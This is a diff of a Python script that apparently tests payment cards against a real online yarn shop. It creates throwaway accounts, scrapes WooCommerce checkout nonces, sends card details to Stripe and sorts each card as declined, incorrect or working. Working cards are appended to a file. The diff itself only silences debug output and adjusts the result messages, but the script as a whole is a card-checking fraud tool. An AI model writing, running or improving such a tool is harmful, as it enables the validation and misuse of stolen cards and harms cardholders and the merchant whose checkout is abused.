@@ -39,7 +39,7 @@ def Tele(ccx):
     data = f'email={mail}@gmail.com&mc_language=en&subscribed=1'
     response = session.post('https://yarnclub.com.au/wp-admin/admin-ajax.php',params=params,headers=headers,data=data,)
     jar.update(response.cookies)
-    print("account created" + mail)
+    # print("account created" + mail)
     #addstore
     headers = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -87,10 +87,9 @@ def Tele(ccx):
     match = re.search(r'id="woocommerce-process-checkout-nonce".*?value="(.*?)"', response.text)
     if match:
         nonce = match.group(1)
-        print("nonce:", nonce)
+        # print("nonce:", nonce)
     else:
         print("nonce not found.")
-        exit()
     jar.update(response.cookies)
 
     #update order
@@ -176,7 +175,7 @@ def Tele(ccx):
     response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     json_data = response.json()
     payment_id = json_data.get("id")
-    print(f"Payment ID: {payment_id}")
+    # print(f"Payment ID: {payment_id}")
     #checkout
     headers = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -247,8 +246,10 @@ def Tele(ccx):
     response = session.post('https://yarnclub.com.au/', params=params,headers=headers, data=data)
     if "declined." in response.text:
         print(Fore.RED + f"{ccx} declined")
+    elif "No such PaymentMethod: 'None'" in response.text:
+        print(Fore.RED  + f"{ccx} card detail incoorect 'None'")
     elif "incorrect." in response.text:
-        print(Fore.GREEN + f"{ccx}{response.text}")
+        print(Fore.GREEN + f"{ccx} The card number is incorrect.")
     else:
         print(Fore.GREEN + f"{ccx}{response.text}")
         with open("q.txt","a+")as f:
